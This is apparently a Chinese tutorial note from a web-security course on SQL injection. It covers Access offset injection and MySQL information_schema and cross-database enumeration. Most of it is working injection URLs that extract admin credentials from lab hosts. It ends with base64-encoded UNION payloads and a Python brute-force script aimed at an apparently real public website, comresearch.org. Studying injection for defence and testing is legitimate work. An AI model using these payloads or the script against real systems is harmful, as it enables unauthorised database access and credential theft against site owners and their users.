![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721056176176-4e35cac3-9bee-4005-9cd5-a9907599efe7.png)

```plain
#知识点：
1、脚本代码与数据库前置知识
2、Access数据库注入-简易&偏移
3、MYSQL数据库注入-简易&权限跨库

#前置知识：
-SQL注入漏洞产生原理分析
-SQL注入漏洞危害利用分析
-脚本代码与数据库操作流程
-数据库名，表名，列名，数据
-数据库类型，数据库用户，用户权限

脚本代码在实现代码与数据库进行数据通讯时（从数据库取出相关数据进行页面显示），将定义的SQL语句进行执行查询数据时。其中的SQL语句能通过参数传递自定义值来实现控制SQL语句，从而执行恶意的SQL语句，可以实现查询其他数据（数据库中的敏感数据，如管理员帐号密码）。这一个过程就可以叫做SQL注入漏洞。
```

- ASP+Access-简易注入-字典猜解

```plain
漏洞产生根本条件：可控变量 特定函数
http://192.168.46.160:85/Production/PRODUCT.asp
http://192.168.46.160:85/Production/PRODUCT.asp?id=1513
如果下面的URL地址测试注入判断id有注入，手工测试该如何进行？
http://192.168.46.160:85/Production/PRODUCT.asp?id=1513&page=1
http://192.168.46.160:85/Production/PRODUCT.asp?page=1&id=1513
Production/PRODUCT.asp?id=1513 注入语句&page=1 对
Production/PRODUCT.asp?id=1513&page=1 注入语句 错

SQL注入攻击流程：
1、猜测数据库类型
2、根据类型选择思路

ACCESS 独立存在
数据库名
             表名
                     列名
                            数据

第一步查询表明，第二步查询列名

http://192.168.199.136:85/Production/PRODUCT_DETAIL.asp?id=1513%20order%20by%2022   正确
http://192.168.199.136:85/Production/PRODUCT_DETAIL.asp?id=1513%20order%20by%2023 错误

查询到22个字段，然后进行组合：
http://192.168.199.136:85/Production/PRODUCT_DETAIL.asp?id=1513 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22 from admin
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721056174934-0d0edae3-385a-432e-8e89-1fd010737315.png)

```plain
admin只能靠猜测才能得到，
admin字段跟password字段也只能靠猜测才能得到。
http://192.168.199.136:85/Production/PRODUCT_DETAIL.asp?id=1513 UNION SELECT 1,2,admin,4,5,6,7,8,9,10,11,12,13,14,password,16,17,18,19,20,21,22 from admin
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721056175483-69aaf6d2-58bd-48f0-a431-ec4b6f72d293.png)

由于Access数据库特性导致这个SQL注入是需要借助字典去猜解表名和列名的，那么就会出现表名或列名猜解不到，可以自定义社工字典或采用偏移注入！

- ASP+Access-偏移注入-报错显示

```plain
偏移注入就是解决表名已知，列名未知的情况！
https://www.fujieace.com/penetration-test/access-offset-injection.html
用*号去替换一个字段
http://192.168.199.136:85/Production/PRODUCT_DETAIL.asp?id=1513 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,* from admin
逐渐减少字段，直到正确
当减到16的时候正常：
http://192.168.199.136:85/Production/PRODUCT_DETAIL.asp?id=1513 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,* from admin
那么*号代表6个
http://192.168.199.136:85/Production/PRODUCT_DETAIL.asp?id=1513 UNION SELECT 1,2,3,4,5,6,7,8,9,10,a.id,b.id,* from (admin as a inner join admin as b on a.id = b.id)
这样注入就会随机爆出字段（源代码）
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721056175233-8081b93e-1aeb-4e5d-a55a-659bece6b156.png)

二级偏移：http://192.168.199.136:85/Production/PRODUCT_DETAIL.asp?id=1513 UNION SELECT 1,2,3,4,a.id,b.id,c.id,* from ((admin as a inner join admin as b on a.id = b.id)inner join admin as c on a.id=c.id)

- PHP+MYSQL-简易注入-存储特性

```plain
MYSQL 统一管理
最高数据库用户=root用户
数据库A=网站A=数据库用户A
         表名
                       列名
                                       数据
数据库B=网站B=数据库用户B
数据库C=网站C=数据库用户C

为了网站和数据库的安全性，MYSQL内置有ROOT最高用户，划分等级，每个用户对应管理一个数据库，这样保证无不关联，从而不会影响到其他数据库的运行。
MYSQL两种思路：
	非ROOT的注入攻击：常规类的猜解
	ROOT用户的注入攻击：文件读写操作，跨库查询注入等
黑盒测试中可以采用user()获取当前用户权限，白盒中看连接用户即可！

MYSQL5.0以上版本：自带的数据库名information_schema
information_schema：存储数据库下的数据库名及表名，列名信息的数据库
information_schema.schematas:记录数据库信息表
information_schema.tables：记录表名信息的表
information_schema.columns：记录列名信息表


获取相关数据：
1、数据库版本-看是否符合information_schema查询-version()-5.5.53
2、数据库用户-看是否符合ROOT型注入攻击-user()-root@localhost
3、当前操作系统-看是否支持大小写或文件路径选择-@@version_compile_os-win
4、数据库名字-为后期猜解指定数据库下的表，列做准备-database()-syguestbook
获取数据库用户和版本：
http://127.0.0.1:8081/web/mysql/news.php?id=2  UNION ALL SELECT user(),version(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721056174961-d24a2a50-cc6b-4d85-bbcc-31bc80875d67.png)

http://127.0.0.1:8081/web/mysql/news.php?id=2  UNION ALL SELECT database(),@@version_compile_os,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721056175489-b92cdacf-981b-4a5f-95e1-305ca5039bd9.png)

```plain
ROOT类型攻击-猜解数据，文件读写，跨库查询
如果显示一部分，用到group_concat函数就可以显示全部
获取syguestbook数据库下面的表名信息：
UNION SELECT table_name,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17 from information_schema.tables where table_schema='syguestbook'
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721056175466-f93597c7-4b33-477a-9a61-1e61ee0aec4c.png)

```plain
获取表名sy_adminuser的列名信息：
UNION SELECT column_name,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17 from information_schema.columns where table_name='sy_adminuser' and table_schema='syguestbook'
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721056176153-65dfdd91-2cd4-4015-8944-ec0d40b3d72f.png)

```plain
获取指定数据：
UNION SELECT username,password,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17 from sy_adminuser
```

- PHP+MYSQL-跨库注入-权限属性

```plain
跨库注入：实现当前网站跨库查询其他数据库对应网站的数据
获取当前mysql下的所有数据库名
UNION SELECT schema_name,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17 from information_schema.schemata
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721056175974-b251841a-fcc5-46b9-87b2-05577d6495d4.png)

```plain
获取数据库名xhcms下的表名信息
UNION SELECT table_name,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17 from information_schema.tables where table_schema='xhcms'
获取数据库名xhcms下的表manage下的列名信息：
UNION SELECT column_name,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17 from information_schema.columns where table_name='manage' and table_schema='xhcms'
获取指定数据：
UNION SELECT user,password,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17 from xhcms.manage
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721056176092-3d1d3cd6-1a76-477f-aeec-36d9506e8625.png)

```plain
http://www.comresearch.org/researchDetails.php?id=MD=
爆数字：
http://www.comresearch.org/researchDetails.php?id=MSB1bmlvbiBzZWxlY3QgMSwyLDMsNCw1LDYsNw==

http://www.comresearch.org/researchDetails.php?id=MSB1bmlvbiBzZWxlY3QgMSxkYXRhYmFzZSgpLDMsdmVyc2lvbigpLHVzZXIoKSw2LDc=
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721056175859-1ee661a4-b7f6-4bd1-a7c6-f10202dea8e8.png)

```plain
版本不对，这个时候只能暴力破解
脚本代码：
import requests
import base64
url='http://www.comresearch.org/researchDetails.php?id='
sqlin='1 union select 1,2,3,4,5,6,7 from '
for lieming in open('common-tables.txt'):
    lieming=lieming.strip()
    s=sqlin+lieming
    ss=base64.b64encode(s.encode('utf-8'))
    #print(lieming)
    sqlins=url+ss.decode('utf-8')
    #print(sqlins)
    sss=requests.get(sqlins)
    if 'Warning' in sss.text:
        print('失败')
    else:
        print('成功')
        print(sqlins)
```





来自: [安全的小菜鸡 - 第24天：WEB攻防-通用漏洞&SQL注入&MYSQL跨库&ACCESS偏移](http://www.mumuxi8.com/?id=27)